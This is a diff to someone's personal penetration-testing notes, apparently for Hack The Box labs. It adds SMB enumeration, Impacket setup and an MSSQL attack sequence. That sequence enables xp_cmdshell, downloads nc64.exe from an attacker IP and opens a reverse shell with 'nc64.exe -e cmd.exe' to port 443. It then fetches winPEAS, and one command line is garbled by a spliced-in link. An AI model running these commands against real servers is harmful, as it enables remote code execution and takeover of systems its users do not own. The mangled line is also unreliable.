@@ -6,6 +6,8 @@ how to jenkins bruteforce?
 SSTI,XSS,blob:https://app.hackthebox.com/32caa1fd-54a8-499f-acea-b27d3e03c561
 
 SMBCLIENT
+
+smbclient -N -L \\\\{TARGET_IP}\\
 smbclient -L 10.129.209.18 -U Administrator
 smbclient \\\\10.129.209.18\C$ -U Administrator
 
@@ -34,6 +36,33 @@ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 
 gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://ignition.htb
 
 
+#Impacket
+git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+pip3 install .
+# OR:
+sudo python3 setup.py install
+# In case you are missing some modules:
+pip3 install -r requirements.txt
+
+cd impacket/examples/
+python3 mssqlclient.py -h
+
+SELECT is_srvrolemember('sysadmin');
+
+EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
+first as it’s disabled by default:
+EXEC sp_configure 'show advanced options', 1; — priv
+RECONFIGURE; — priv
+EXEC sp_configure 'xp_cmdshell', 1; — priv
+RECONFIGURE; — priv
+
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.78/nc64.exe -outfile nc64.exe"
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.78 443"
+[xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe)
+10.10.14.9 443"
+wget http://10.10.14.78:8000/winPEASx64.exe -outfile winPEASx64.exe
+https://github.com/int0x33/nc.exe/blob/master/nc64.exe
 
 Services:
 FTP:
